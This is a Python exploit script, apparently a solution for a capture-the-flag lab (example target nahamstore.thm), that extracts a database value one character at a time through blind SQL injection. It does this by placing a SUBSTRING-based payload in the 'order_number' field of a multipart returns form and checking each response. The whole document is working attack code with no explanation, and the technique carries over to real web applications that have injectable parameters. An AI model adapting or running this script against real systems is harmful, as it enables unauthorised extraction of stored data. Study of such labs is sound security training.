import sys
import requests
import urllib3
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def flag(url):
    flag=""
    for i in range(1,35):
        for j in range(48,126):
            
            if i == 1:
                char = '{'
            elif i == 34:
                char = '}'
            else:
                char = chr(j)

            sqli_payload = '12000 or SUBSTRING((SELECT flag FROM sqli_two limit 1),%s,1)="%s";-- -' %(i,char)
            headers = {'Content-Type': 'multipart/form-data; boundary=---------------------------7879616527480578192387742117'}
            raw_payload = '-----------------------------7879616527480578192387742117\nContent-Disposition: form-data; name="order_number"\n\n%s\n-----------------------------7879616527480578192387742117\nContent-Disposition: form-data; name="return_reason"\n\n1\n-----------------------------7879616527480578192387742117\nContent-Disposition: form-data; name="return_info"\n\nkjlajdfj\n\n-----------------------------7879616527480578192387742117--' %sqli_payload
            
            r = requests.post(proxies=proxies, headers=headers, data=raw_payload, verify=False, url=url)
            res = r.text
            if "Status" in res:
                flag += char
                sys.stdout.write('\r' + flag)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + flag + char)
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s url" %sys.argv[0])
        print("[+] Example: %s http://nahamstore.thm/returns" %sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("Extracting the flag....")
    flag(url)

if __name__ == "__main__":
    main()
